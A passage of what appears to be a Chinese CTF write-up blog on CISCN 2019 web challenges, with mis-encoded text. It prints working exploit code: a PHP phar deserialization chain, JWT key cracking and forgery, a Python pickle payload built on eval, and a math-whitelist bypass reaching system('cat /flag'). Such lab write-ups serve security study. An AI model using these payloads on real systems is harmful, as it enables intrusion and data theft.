class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¡®å®šæ˜¯å¯ä»¥è¿›è¡Œæ–‡ä»¶è¯»å–äº†ã€‚æ¥ä¸‹æ¥æŒ–æ˜ä¸€ä¸‹å‡½æ•°çš„è°ƒç”¨ã€‚é¦–å…ˆ<code>close()</code>æ˜¯Fileç±»çš„æ–¹æ³•ï¼Œè€ŒFileç±»åªåœ¨Filelistç±»ä¸­æœ‰è°ƒç”¨è¿‡ã€‚ä½†Filelistä¸­å¹¶æ²¡æœ‰è°ƒç”¨<code>close()</code>æ–¹æ³•çš„ä½ç½®ã€‚æ­¤æ—¶éœ€è¦æ³¨æ„Filelistç±»ä¸­çš„ä¸¤ä¸ªé­”æœ¯æ–¹æ³•ä¹‹ä¸€ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($func, $args)</span> </span>&#123;</span><br><span class="line">        array_push(<span class="keyword">$this</span>-&gt;funcs, $func);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å®ƒå°†Filelistç±»ä¸­çš„filesæ•°ç»„å…¨éƒ¨éå†äº†ä¸€éï¼Œå¹¶æ‰§è¡Œå¯¹åº”çš„<code>func()</code>ç»“æœè¢«å­˜è¿›resultã€‚ä¹‹åçš„<code>__destruct()</code>æ–¹æ³•åˆ™ä¼šå°†resultç­‰ç­‰ç»“æœæ‰“å°å‡ºæ¥ã€‚<br>è¿™ä¸€æ¡åˆ©ç”¨åœ¨äºï¼šç¡®ä¿äº†Filelistçš„å¯¹è±¡å¦‚æœèƒ½å€Ÿæ­¤é­”æœ¯æ–¹æ³•è°ƒç”¨<code>close()</code>æ–¹æ³•ï¼Œé‚£ä¹ˆå®ƒæœ€åé”€æ¯æ—¶ææ„å‡½æ•°ä¼šæ‰“å°å‡ºæˆ‘ä»¬éœ€è¦çš„æ–‡ä»¶å†…å®¹ã€‚<br>ä¹‹åå†æ¬¡å®¡è®¡ï¼Œæ³¨æ„åˆ°Userç±»çš„<code>__destruct()</code>æ–¹æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db-&gt;close();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>åŸæœ¬åªæ˜¯ä¸€ä¸ªåŒå<code>close()</code>å‡½æ•°ï¼Œä½†æ˜¯æ­¤å¤„å´å­˜åœ¨ç€å¯åˆ©ç”¨ä¹‹å¤„ã€‚å‡å¦‚æˆ‘ä»¬çš„æ–‡ä»¶ä¸Šä¼ çš„æ˜¯Userç±»çš„å¯¹è±¡ã€‚é”€æ¯æ—¶è‡ªç„¶ä¼šæ‰§è¡Œ<code>close()</code>å‡½æ•°ã€‚ä½†å¦‚æœæŠŠ<code>db</code>è®¾ç½®ä¸ºFilelistç±»çš„å¯¹è±¡ï¼Œé‚£ä¹ˆ<code>db-&gt;close()</code>æ‰§è¡Œæ—¶å°†æ‰¾ä¸åˆ°<code>close()</code>å‡½æ•°ï¼Œè¿›è€Œæ‰§è¡Œå…¶<code>files</code>æ•°ç»„é‡Œçš„æ¯ä¸€ä¸ªå‡½æ•°ã€‚é‚£ä¹ˆå¦‚æœ<code>files</code>æ•°ç»„é‡Œæ˜¯å­˜åœ¨åŒåå‡½æ•°<code>close</code>çš„Fileç±»å¯¹è±¡ï¼Œå°±èƒ½æˆåŠŸæ‰§è¡Œæ–‡ä»¶è¯»å–ã€‚<br>æ‰¾åˆ°åˆ©ç”¨é“¾åï¼Œexpå¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $db;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files;</span><br><span class="line">    <span class="keyword">private</span> $results;</span><br><span class="line">    <span class="keyword">private</span> $funcs;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $file = <span class="keyword">new</span> File();</span><br><span class="line">        $file-&gt;filename = <span class="string">'/flag.txt'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>($file);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@unlink(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"a.phar"</span>); </span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); </span><br><span class="line">$o = <span class="keyword">new</span> User();</span><br><span class="line">$o-&gt;db = <span class="keyword">new</span> FileList();</span><br><span class="line">$phar-&gt;setMetadata($o);</span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>ç”Ÿæˆçš„a.pharä¿®æ”¹åç¼€ä¸Šä¼ ï¼Œä¹‹åéœ€è¦æ‰¾è§¦å‘æ–¹å¼ï¼Œæ­¤å¤„éœ€è¦æ³¨æ„ä¸€ç‚¹ï¼Œåœ¨download.phpä¸­ï¼Œè®¾ç½®äº†ç›®å½•ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ini_set(<span class="string">"open_basedir"</span>, getcwd() . <span class="string">":/etc:/tmp"</span>);</span><br></pre></td></tr></table></figure><p>è€Œåªæœ‰delete.phpä¸­çš„ç›®å½•æ˜¯åœ¨é¢˜ç›®ç»™å®šçš„æ–‡ä»¶ä¸Šä¼ æ²™ç›’ä¸­çš„ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chdir($_SESSION[<span class="string">'sandbox'</span>]);</span><br></pre></td></tr></table></figure><p>æ•…åªæœ‰deleteæ“ä½œèƒ½ç›´æ¥<code>phar://</code>è§¦å‘ååºåˆ—åŒ–ã€‚<br><img src="/2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/flag1.PNG" class="lazyload" data-srcset="flag1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag"></p><p>(è¿™é‡Œçš„æ–‡ä»¶è¯»å–flag.txtæ˜¯ä¼ ç»Ÿè‰ºèƒ½ï¼Ÿæ¯æ¬¡é¢˜ç›®éƒ½æ²¡äº¤ä»£ï¼‰</p><h1 id="ikun-pythonååºåˆ—åŒ–"><a href="#ikun-pythonååºåˆ—åŒ–" class="headerlink" title="ikun(pythonååºåˆ—åŒ–)"></a>ikun(pythonååºåˆ—åŒ–)</h1><p>ç»“åˆäº†å¾ˆå¤šçŸ¥è¯†ç‚¹çš„ä¸€é“é¢˜ç›®ï¼Œä½†æ˜¯æœ€åä¸€æ­¥çš„pythonååºåˆ—åŒ–ç¡®å®ä¸ä¼šï¼Œåªå¥½å»æ‰¾äº†æ‰¾wpã€‚(æœ¬æ¥ä¹‹å‰æ‰“ç®—å­¦ä¸‹pythonååºåˆ—åŒ–çš„ï¼Œç»“æœæå¿˜äº†hhh) </p><p>é¦–å…ˆç™»é™†é¢˜ç›®å‘ç°åœ¨è¿«å®³cxkï¼ŒåŒæ—¶åº•ä¸‹æœ‰è®¸å¤šå•†å“æç¤ºéœ€è¦è´­ä¹°lv6çš„å•†å“ã€‚ä½†æ˜¯çœ‹äº†åŠå¤©å‰å‡ é¡µå¹¶æ²¡æ‰¾åˆ°lv6å•†å“ï¼Œç”±äºé¡µæ•°pageç›´æ¥getä¼ å€¼ï¼Œçœ‹æ¥éœ€è¦è„šæœ¬çˆ†ç ´ä¸€ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">'http://2c771d3e-86f0-4f72-9815-f19dcb4fd51a.node3.buuoj.cn/shop?page='</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">2000</span>):</span><br><span class="line">r=requests.get(url+str(i))</span><br><span class="line"><span class="keyword">if</span> <span class="string">'lv6.png'</span> <span class="keyword">in</span> r.text:</span><br><span class="line"><span class="keyword">print</span> (i)</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>ä¹‹åå‘ç°lv6å•†å“ï¼ŒåŠ å…¥åˆ°è´­ç‰©è½¦åï¼Œå‡†å¤‡æ³¨å†Œè´¦å·å¹¶ç™»å½•è´­ä¹°ã€‚æ˜¾ç„¶é’±æ•°æ˜¯ä¸å¤Ÿçš„ï¼Œä½†æ˜¯å´æœ‰æŠ˜æ‰£è¿™ä¸€å‚æ•°è¢«ç›´æ¥postä¼ å€¼ã€‚é‚£ä¹ˆä¿®æ”¹å…¶å€¼è¶³å¤Ÿå°å³å¯ã€‚å¾—åˆ°ä¸€ä¸ªç›®å½•<code>b1g_m4mber</code>ã€‚åº”è¯¥æ˜¯åå°åœ°å€ã€‚<br>è®¿é—®ç½‘å€æç¤ºéœ€è¦adminæ“ä½œæƒé™ã€‚è¿™é‡ŒæŠ“åŒ…ä¸€ä¸‹ï¼Œå‘ç°cookieé‡Œå±…ç„¶æœ‰JWTã€‚çœ‹æ¥æ˜¯æ¯”è¾ƒå¸¸è§çš„JWTä¼ªé€ è®¤è¯äº†ã€‚<br>(ä¹‹å‰åœ¨hacktheboxæŸä¸€å°é¶æœºä¸­å°±å­˜åœ¨ä»¿é€ JWTç™»å½•çš„æ“ä½œï¼Œåº”è¯¥è¯´å¹¶ä¸éš¾ï¼Œè€Œä¸”æ¯”è¾ƒå¥½ç†è§£)<br>å…ˆæ‹¿æ¥base64è§£ç ï¼Œå‘ç°å­˜åœ¨ä¹±ç ã€‚å¯èƒ½æ˜¯å› ä¸ºåŠ äº†ç›å€¼keyçš„åŸå› ã€‚é‚£ä¹ˆç¬¬ä¸€æ­¥å…ˆçˆ†ç ´ä¸‹keyå€¼ï¼š<br><a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener">https://github.com/brendan-rius/c-jwt-cracker</a><br><img src="/2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1.PNG"><br>å¾—åˆ°JWTKey ä¸º1Kun,æ¥ä¸‹æ¥ä¸Š<a href="https://jwt.io/" target="_blank" rel="noopener">https://jwt.io/</a><br>å»ç”Ÿæˆadminçš„jwt token.<br><img src="/2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/2.PNG" class="lazyload" data-srcset="2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="jwtä¼ªé€ "><br>å¯ä»¥çœ‹åˆ°jwt-tokenä¸€å®šæ˜¯xxx.yyy.zzzçš„å½¢å¼ã€‚ä¸”ä¸‰æ®µå„è‡ªä»£è¡¨header,paylaodï¼Œsignatureçš„jsonæ•°æ®å†…å®¹ç»base64å¤„ç†ã€‚çˆ†ç ´keyå€¼ä¿®æ”¹paylloadä¸ºadminä¹Ÿæ˜¯å®¶å¸¸ä¾¿é¥­ã€‚<br>æ§åˆ¶å°é‡Œä¿®æ”¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.cookie&#x3D;&quot;JWT&#x3D;xxxxxxxxxxx&quot;</span><br></pre></td></tr></table></figure><p>æˆåŠŸç™»é™†ã€‚</p><p>ä¹‹åå‘ç°æºç å­˜åœ¨<a href="http://www.zipã€‚å¯ä»¥æ‹¿åˆ°æºç ã€‚ç„¶åæˆ‘å°±ä¸ä¼šäº†" target="_blank" rel="noopener">www.zipã€‚å¯ä»¥æ‹¿åˆ°æºç ã€‚ç„¶åæˆ‘å°±ä¸ä¼šäº†</a>â€¦â€¦.<br>æŸ¥wpåå‘ç°æ˜¯pythonååºåˆ—åŒ–ã€‚å…·ä½“æ¼æ´åœ¨Admin.pyï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">from</span> sshop.base <span class="keyword">import</span> BaseHandler</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminHandler</span><span class="params">(BaseHandler)</span>:</span></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.current_user == <span class="string">"admin"</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">'form.html'</span>, res=<span class="string">'This is Black Technology!'</span>, member=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">'no_ass.html'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            become = self.get_argument(<span class="string">'become'</span>)</span><br><span class="line">            p = pickle.loads(urllib.unquote(become))</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">'form.html'</span>, res=p, member=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">'form.html'</span>, res=<span class="string">'This is Black Technology!'</span>, member=<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>becomeå¯æ§ã€‚<br>è¿™é‡Œå…¶å®å¯ä»¥æŠŠ<code>pickle.loads</code>çš„æ“ä½œç†è§£ä¸ºååºåˆ—åŒ–ã€‚è€Œ<code>__reduce__</code>è¿™ä¸€é­”æœ¯æ–¹æ³•ä¼šåœ¨å¯¹è±¡è¢«pickleæ—¶è°ƒç”¨ã€‚ä»è€Œå¯ä»¥æ„é€ payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">       <span class="keyword">return</span> (eval, (<span class="string">"open('/flag.txt','r').read()"</span>,))</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">a= urllib.quote(a)</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘çš„expåœ¨æœ¬æœºè·‘å‡ºæ¥ç»“æœä¸çŸ¥ä¸ºä½•æ˜¯é”™çš„ã€‚åªæœ‰ç”¨kaliæ‰è·‘å‡ºæ­£ç¡®çš„ç»“æœ<br><img src="/2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/3.PNG" class="lazyload" data-srcset="3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="exp"><br>ä¼ å€¼æ‹¿flag<br><img src="/2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/flag2.PNG" class="lazyload" data-srcset="flag2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag"></p><h1 id="Love-Math-æ„é€ RCE"><a href="#Love-Math-æ„é€ RCE" class="headerlink" title="Love Math(æ„é€ RCE)"></a>Love Math(æ„é€ RCE)</h1><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//ä¾‹å­ c=20-1</span></span><br><span class="line">    $content = $_GET[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen($content) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"å¤ªé•¿äº†ä¸ä¼šç®—"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $content)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    $whitelist = [<span class="string">'abs'</span>, <span class="string">'acos'</span>, <span class="string">'acosh'</span>, <span class="string">'asin'</span>, <span class="string">'asinh'</span>, <span class="string">'atan2'</span>, <span class="string">'atan'</span>, <span class="string">'atanh'</span>, <span class="string">'base_convert'</span>, <span class="string">'bindec'</span>, <span class="string">'ceil'</span>, <span class="string">'cos'</span>, <span class="string">'cosh'</span>, <span class="string">'decbin'</span>, <span class="string">'dechex'</span>, <span class="string">'decoct'</span>, <span class="string">'deg2rad'</span>, <span class="string">'exp'</span>, <span class="string">'expm1'</span>, <span class="string">'floor'</span>, <span class="string">'fmod'</span>, <span class="string">'getrandmax'</span>, <span class="string">'hexdec'</span>, <span class="string">'hypot'</span>, <span class="string">'is_finite'</span>, <span class="string">'is_infinite'</span>, <span class="string">'is_nan'</span>, <span class="string">'lcg_value'</span>, <span class="string">'log10'</span>, <span class="string">'log1p'</span>, <span class="string">'log'</span>, <span class="string">'max'</span>, <span class="string">'min'</span>, <span class="string">'mt_getrandmax'</span>, <span class="string">'mt_rand'</span>, <span class="string">'mt_srand'</span>, <span class="string">'octdec'</span>, <span class="string">'pi'</span>, <span class="string">'pow'</span>, <span class="string">'rad2deg'</span>, <span class="string">'rand'</span>, <span class="string">'round'</span>, <span class="string">'sin'</span>, <span class="string">'sinh'</span>, <span class="string">'sqrt'</span>, <span class="string">'srand'</span>, <span class="string">'tan'</span>, <span class="string">'tanh'</span>];</span><br><span class="line">    preg_match_all(<span class="string">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span>, $content, $used_funcs);  </span><br><span class="line">    <span class="keyword">foreach</span> ($used_funcs[<span class="number">0</span>] <span class="keyword">as</span> $func) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å¸®ä½ ç®—å‡ºç­”æ¡ˆ</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'echo '</span>.$content.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¢˜ç›®å¾ˆæœ‰æ„æ€ï¼Œè¾¾æˆç›®çš„æ˜¾ç„¶æ˜¯RCEã€‚ä½†æ˜¯å¯ä»¥å‘ç°è¿‡æ»¤äº†å¾ˆå¤šå­—ç¬¦ä¸å‡½æ•°ï¼Œé™åˆ¶äº†é•¿åº¦ã€‚è€Œç™½åå•å†…çš„å‡½æ•°å…¨éƒ¨æ˜¯æ•°å­¦å‡½æ•°ï¼Œé»‘åå•çš„å­—ç¬¦è¿‡æ»¤äº†å¸¸è§æ ‡ç‚¹ã€‚ç°åœ¨è¦è¾¾æˆRCEéœ€è¦ç»•è¿‡ä¸Šçš„å¥‡æ·«æŠ€å·§ã€‚</p><p>é¦–å…ˆæœ‰ä¸€ç§æ€è·¯æ˜¯åˆ†å¼€ä¼ å€¼ ï¼Œæˆ‘ä¸ªäººä¹Ÿæ¯”è¾ƒåå¥½è¿™ç§åšæ³•ã€‚å…·ä½“å½¢å¼å¤§è‡´æ˜¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;$_GET[a]&amp;a&#x3D;system(&#39;ls&#39;);</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯æ­¤é¢˜é¦–å…ˆå˜é‡åä¸èƒ½éšæ„ï¼Œåªèƒ½ä»ç™½åå•ä¸­æ‰¾å‡ºå¯ç”¨æ•°å­¦ç¬¦å·ä½œä¸ºå˜é‡åã€‚æ­¤å¤„è€ƒè™‘é•¿åº¦ä½¿ç”¨piã€‚<br>ç„¶åæ˜¯è€ƒè™‘ï¼Œåœ¨<code>_GET[]</code>è¢«è¿‡æ»¤çš„æƒ…å†µä¸‹èƒ½ä½¿ç”¨ä»€ä¹ˆæ•°å­¦å‡½æ•°è¾¾æˆæ„é€ å­—ç¬¦ä¸²çš„ç›®çš„ã€‚è¿™é‡Œåº”è¯¥é¦–å…ˆè€ƒè™‘è¿›åˆ¶è½¬æ¢å‡½æ•°ï¼Œå› ä¸º10è¿›åˆ¶ä»¥ä¸Šçš„æ•°éƒ½æœ‰è‹±æ–‡å­—æ¯ä½œä¸ºæ•°ç ã€‚è€Œå‡å¦‚æ˜¯36è¿›åˆ¶æ•°çš„è¯ï¼Œå°†ä¼šæ‹¥æœ‰1~10åŠ ä¸Š26ä¸ªè‹±æ–‡å­—æ¯ä½œä¸ºæ•°ç ï¼Œè¿™è¶³ä»¥æˆ‘ä»¬æ‹¼å‡‘å‡ºpayloadã€‚<br>å‡å¦‚payloadæ˜¯ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;($_GET)&#123;0&#125;($_GET)&#123;1&#125;;&amp;0&#x3D;system&amp;1&#x3D;cat &#x2F;flag</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæˆ‘ä»¬åªéœ€æ„é€ å‡º<code>_GET</code>å­—ç¬¦ä¸²ã€‚<br>å…·ä½“å€’æ¨æ–¹æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_GET-&gt;bin2hex(&#39;_GET&#39;)-&gt;5f474554</span><br><span class="line">-&gt;hexdec(&#39;5f474554&#39;)-&gt;1598506324#çº¯æ•°å­—</span><br><span class="line">#éœ€è¦æ„é€ hex2bin()</span><br><span class="line">base_convert(&#39;hex2bin&#39;,36,10)-&gt;37907361743</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));</span><br><span class="line">$pi&#x3D;hex2bin(5f474554);</span><br><span class="line">$pi&#x3D;_GET;</span><br><span 